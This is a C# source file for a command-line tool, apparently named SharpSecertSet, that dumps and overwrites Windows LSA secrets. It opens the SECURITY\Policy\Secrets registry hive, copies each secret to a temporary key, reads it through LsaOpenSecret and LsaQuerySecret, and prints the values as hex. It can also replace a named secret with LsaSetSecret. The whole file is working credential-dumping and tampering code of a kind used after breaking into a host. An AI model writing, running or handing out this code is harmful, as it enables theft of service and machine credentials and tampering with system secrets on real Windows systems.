using System;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;

namespace SharpSecertSet
{
    class Program
    {
        static void PrintHelp()
        {
            Console.WriteLine("Usage: %s dump [key]", System.AppDomain.CurrentDomain.FriendlyName);
            Console.WriteLine("Usage: %s set key value --base64", System.AppDomain.CurrentDomain.FriendlyName);
        }

        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                PrintHelp();
            } 
            else if (args[0] == "dump")
            {
                if (args.Length == 1)
                {
                    DumpSecretOrAll(null);
                } 
                else
                {
                    DumpSecretOrAll(args[1]);
                }
            }
            else if (args[0] == "set")
            {
                if (args.Length == 3)
                {
                    WriteLSASecret(args[1], args[2]);
                }
                else if (args.Length == 4 && args[3] == "--base64")
                {
                    //update from base64 string
                }
                else
                {
                    PrintHelp();
                }
            }
        }

        public static string LSAUS2string(advapi32.LSA_UNICODE_STRING lsaus)
        {
            char[] cvt = new char[lsaus.Length / UnicodeEncoding.CharSize];
            Marshal.Copy(lsaus.Buffer, cvt, 0, lsaus.Length / UnicodeEncoding.CharSize);
            return new string(cvt);
        }

        public static string ByteArrayToString(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }

        public static bool RenameSubKey(RegistryKey parentKey,
            string subKeyName, string newSubKeyName)
        {
            CopyKey(parentKey, subKeyName, newSubKeyName);
            parentKey.DeleteSubKeyTree(subKeyName);
            return true;
        }

        public static bool CopyKey(RegistryKey parentKey,
            string keyNameToCopy, string newKeyName)
        {
            //Create new key
            RegistryKey destinationKey = parentKey.CreateSubKey(newKeyName);

            //Open the sourceKey we are copying from
            RegistryKey sourceKey = parentKey.OpenSubKey(keyNameToCopy);

            RecurseCopyKey(sourceKey, destinationKey);

            return true;
        }

        private static void RecurseCopyKey(RegistryKey sourceKey, RegistryKey destinationKey)
        {
            //copy all the values
            foreach (string valueName in sourceKey.GetValueNames())
            {
                object objValue = sourceKey.GetValue(valueName);
                RegistryValueKind valKind = sourceKey.GetValueKind(valueName);
                destinationKey.SetValue(valueName, objValue, valKind);
            }

            //For Each subKey 
            //Create a new subKey in destinationKey 
            //Call myself 
            foreach (string sourceSubKeyName in sourceKey.GetSubKeyNames())
            {
                RegistryKey sourceSubKey = sourceKey.OpenSubKey(sourceSubKeyName);
                RegistryKey destSubKey = destinationKey.CreateSubKey(sourceSubKeyName);
                RecurseCopyKey(sourceSubKey, destSubKey);
            }
        }

        static void DumpSecretOrAll(string target)
        {
            var Secrets = Registry.LocalMachine.OpenSubKey(@"SECURITY\Policy\Secrets", true);
            foreach (var key in Secrets.GetSubKeyNames())
            {
                if (string.IsNullOrWhiteSpace(target) || key == target) {
                    const string newKeyName = "TempSecret";
                    CopyKey(Secrets, key, newKeyName);
                    var secret = ReadLSASecret(newKeyName);
                    Console.WriteLine("{0}: {1}", key, ByteArrayToString(secret));
                    Secrets.DeleteSubKeyTree(newKeyName);
                }
            }
        }

        static void PopulateLsaUnicodeString(string s, ref advapi32.LSA_UNICODE_STRING lus)
        {
            lus.Buffer = Marshal.StringToHGlobalUni(s);
            lus.Length = (UInt16)(s.Length * UnicodeEncoding.CharSize);
            lus.MaximumLength = (UInt16)((s.Length + 1) * UnicodeEncoding.CharSize);
        }

        static byte[] ReadLSASecret(string key)
        {
            var lsaPolicyHandle = GetPolicyHandle();

            var secretName = new advapi32.LSA_UNICODE_STRING();
            PopulateLsaUnicodeString(key, ref secretName);

            var secretHandle = IntPtr.Zero;
            var ntsResult = advapi32.LsaOpenSecret(lsaPolicyHandle, ref secretName, (uint)advapi32.LSA_SecretAccess.SECRET_QUERY_VALUE, out secretHandle);
            var lsaNtStatusToWinError = advapi32.LsaNtStatusToWinError(ntsResult);
            if (lsaNtStatusToWinError != 0)
            {
                throw new Exception(String.Format("LsaOpenSecret Error: {0}", lsaNtStatusToWinError));
            }

            IntPtr secretValue = IntPtr.Zero;
            ntsResult = advapi32.LsaQuerySecret(secretHandle, out secretValue, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            if (ntsResult != 0)
            {
                throw new Exception(String.Format("LsaQuerySecret Error: {0}", ntsResult));
            }

            var currentData = (advapi32.LSA_UNICODE_STRING)Marshal.PtrToStructure(secretValue, typeof(advapi32.LSA_UNICODE_STRING));

            var SecretData = new byte[currentData.Length];
            Marshal.Copy(currentData.Buffer, SecretData, 0, SecretData.Length);
            advapi32.LsaClose(lsaPolicyHandle);
            return SecretData;
        }

        static void dumpOLD(string key)
        {
            var lsaPolicyHandle = GetPolicyHandle();

            //Secret Name
            var secretName = new advapi32.LSA_UNICODE_STRING();
            secretName.Buffer = Marshal.StringToHGlobalUni(key);
            secretName.Length = (UInt16)(key.Length * UnicodeEncoding.CharSize);
            secretName.MaximumLength = (UInt16)((key.Length + 1) * UnicodeEncoding.CharSize);

            // Retrieve Private Data
            var privateData = IntPtr.Zero;
            var ntsResult = advapi32.LsaRetrievePrivateData(lsaPolicyHandle, ref secretName, out privateData);
            var lsaClose = advapi32.LsaClose(lsaPolicyHandle);

            var lsaNtStatusToWinError = advapi32.LsaNtStatusToWinError(ntsResult);
            if (lsaNtStatusToWinError != 0)
            {
                Console.WriteLine("LsaRetrievePrivateData error: {0}", lsaNtStatusToWinError);
                return;
            }

            var lusSecretData = (advapi32.LSA_UNICODE_STRING)Marshal.PtrToStructure(privateData, typeof(advapi32.LSA_UNICODE_STRING));
            var value = Marshal.PtrToStringAuto(lusSecretData.Buffer);
            //value = value.Substring(0, lusSecretData.Length / 2);



            //var SecretData = new byte[lusSecretData.Length];
            //Marshal.Copy(lusSecretData.Buffer, SecretData, 0, SecretData.Length);


            //Console.WriteLine("Newnew {0}: {1}", key, value);
            //Console.WriteLine("{0}: {1}", key, LSAUS2string(lusSecretData));
        }

        static IntPtr GetPolicyHandle()
        {
            var objectAttributes = new advapi32.LSA_OBJECT_ATTRIBUTES();
            var localsystem = new advapi32.LSA_UNICODE_STRING();
            var lsaPolicyHandle = IntPtr.Zero;

            var lsaOpenPolicyHandle = advapi32.LsaOpenPolicy(ref localsystem, ref objectAttributes,
                (uint)advapi32.LSA_AccessPolicy.POLICY_GET_PRIVATE_INFORMATION, out lsaPolicyHandle);
            if (lsaOpenPolicyHandle != 0)
            {
                Console.WriteLine("LsaOpenPolicy Error: {0}", lsaOpenPolicyHandle);
                System.Environment.Exit(1);
            }
            return lsaPolicyHandle;
        }

        static void WriteLSASecret(string key, string value)
        {
            var lsaPolicyHandle = GetPolicyHandle();

            var secretName = new advapi32.LSA_UNICODE_STRING();
            PopulateLsaUnicodeString(key, ref secretName);
            var secretNewValue = new advapi32.LSA_UNICODE_STRING();
            PopulateLsaUnicodeString(value, ref secretNewValue);

            var secretHandle = IntPtr.Zero;
            var ntsResult = advapi32.LsaOpenSecret(lsaPolicyHandle, ref secretName, 1, out secretHandle);
            var lsaNtStatusToWinError = advapi32.LsaNtStatusToWinError(ntsResult);
            if (lsaNtStatusToWinError != 0)
            {
                Console.WriteLine("LsaOpenSecret Error: {0}", lsaNtStatusToWinError);
            }

            ntsResult = advapi32.LsaSetSecret(secretHandle, ref secretNewValue, ref secretNewValue);
            lsaNtStatusToWinError = advapi32.LsaNtStatusToWinError(ntsResult);
            if (lsaNtStatusToWinError != 0)
            {
                Console.WriteLine("LsaSetSecret Error: {0}", lsaNtStatusToWinError);
            }

            advapi32.LsaClose(lsaPolicyHandle);
        }
    }
}
